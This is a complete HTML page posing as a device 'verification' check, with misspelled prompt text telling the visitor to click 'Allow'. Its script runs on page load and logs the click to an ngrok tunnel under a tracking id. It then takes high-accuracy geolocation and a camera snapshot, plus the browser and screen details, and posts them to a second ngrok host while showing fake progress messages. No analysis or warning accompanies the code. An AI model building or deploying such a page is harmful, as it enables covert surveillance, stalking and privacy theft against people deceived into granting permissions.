<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
    #progress { margin: 20px 0; height: 5px; background: #f0f0f0; border-radius: 5px; overflow: hidden; }
    #progress-bar { height: 100%; width: 0%; background: #4CAF50; transition: width 0.3s; }
    #status { margin: 15px 0; color: #555; }
  </style>
</head>
<body>
<h2>To access this page, <br>You must verify your legitimacy <br>By clickicking on <strong>Allow whiles visiting this site</strong> <br>Verifying your device...</h2>
<div id="progress"><div id="progress-bar"></div></div>
<div id="status">Initializing...</div>

<script>
async function collectData() {
  const linkId = new URLSearchParams(window.location.search).get('id');
  if (!linkId) return;
  
  // Track click
  await fetch(`https://cff93abba672.ngrok-free.app/track_click/${linkId}`)
    .catch(e => console.error("Click tracking failed:", e));

  try {
    // Get location
    const position = await getPosition();
    
    // Capture image
    const image = await captureImage();
    
    // Send data
    await sendData({
      link_id: linkId,
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      image: image,
      user_agent: navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`
    });
  } catch (e) {
    updateStatus(100, "Verification failed");
  }
}

async function getPosition() {
  updateStatus(30, "Getting location...");
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 10000
    });
  }).catch(() => ({
    coords: { latitude: 0, longitude: 0, accuracy: 0 }
  }));
}

async function captureImage() {
  updateStatus(50, "Accessing camera...");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await new Promise(resolve => video.onloadedmetadata = resolve);
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    stream.getTracks().forEach(track => track.stop());
    
    return await new Promise(resolve => {
      canvas.toBlob(blob => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      }, 'image/jpeg', 0.8);
    });
  } catch {
    return null;
  }
}

async function sendData(data) {
  updateStatus(80, "Sending data...");
  await fetch('https://d6d13ede2ed0.ngrok-free.app/receive', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  updateStatus(100, "Verification complete!");
}

function updateStatus(percent, message) {
  document.getElementById('progress-bar').style.width = percent + '%';
  document.getElementById('status').innerText = message;
}

// Start collection
setTimeout(collectData, 500);
</script>
</body>
</html>
